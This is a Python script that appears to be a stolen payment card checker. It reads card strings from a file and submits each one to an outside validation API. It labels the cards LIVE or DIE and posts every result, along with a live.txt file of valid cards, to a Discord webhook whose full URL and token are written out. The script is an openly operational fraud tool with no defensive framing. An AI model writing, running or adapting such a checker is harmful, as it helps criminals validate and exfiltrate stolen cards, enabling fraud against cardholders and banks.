import requests
import json
import time

INPUT_FILE = "list.txt"
API_URL = "https://api.chkr.cc/"
WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM"

approved, declined, unknown, errors = [], [], [], []


def send_embed(title, description, color):
    payload = {
        "embeds": [{
            "title": title,
            "description": description[:4090],
            "color": color,
            "footer": {"text": "String Checker"}
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass


def send_txt_attachment(title, count, file_path):
    with open(file_path, "rb") as f:
        payload = {
            "content": f"**{title}**\nTotal Live: `{count}`"
        }
        files = {
            "file": ("live.txt", f, "text/plain")
        }
        try:
            requests.post(WEBHOOK_URL, data=payload, files=files, timeout=20)
        except:
            pass


def classify_from_code(code):
    if code == 1:
        return "approved"
    if code == 0:
        return "declined"
    return "unknown"


with open(INPUT_FILE, "r", encoding="utf-8") as f:
    lines = f.read().splitlines()

send_embed("Checker Started", "POST checking started…", 3447003)

for index, line in enumerate(lines, start=1):
    if not line.strip():
        continue

    try:
        r = requests.post(API_URL, data={"data": line}, timeout=30)
        data = r.json()

        code = data.get("code", 2)
        status = data.get("status", "Unknown")
        message = data.get("message", "No message")

        card = data.get("card", {})
        card_string = card.get("card", line)

        result = classify_from_code(code)

        record = (
            f"string `{card_string}`\n"
            f"status {status}\n"
            f"message {message}"
        )

        if result == "approved":
            approved.append(card_string)  # ✅ ONLY LIVE STRING
            send_embed("✅ LIVE", record, 3066993)

        elif result == "declined":
            declined.append(card_string)
            send_embed("❌ DIE", record, 15158332)

        else:
            unknown.append(card_string)
            send_embed("⚠ UNKNOWN", record, 15844367)

        print(f"[{index}] {status.upper()} → {message}")
        time.sleep(2.5)

    except json.JSONDecodeError:
        errors.append(line)
        send_embed("🚫 ERROR", f"string `{line}`\nInvalid JSON", 9807270)
        time.sleep(3)

    except Exception as e:
        errors.append(line)
        send_embed("🚫 ERROR", f"string `{line}`\nerror {e}", 9807270)
        time.sleep(3)


# ✅ SAVE ONLY LIVE STRINGS
LIVE_FILE = "live.txt"
with open(LIVE_FILE, "w", encoding="utf-8") as f:
    f.write("\n".join(approved))


summary = (
    f"✅ Live: {len(approved)}\n"
    f"❌ Die: {len(declined)}\n"
    f"⚠ Unknown: {len(unknown)}\n"
    f"🚫 Errors: {len(errors)}"
)

send_embed("Finished Checking", summary, 5763719)

# ✅ SEND LIVE.TXT AS ATTACHMENT
if approved:
    send_txt_attachment("✅ LIVE STRINGS", len(approved), LIVE_FILE)

print("\n✅ DONE CHECKING")
print(summary)

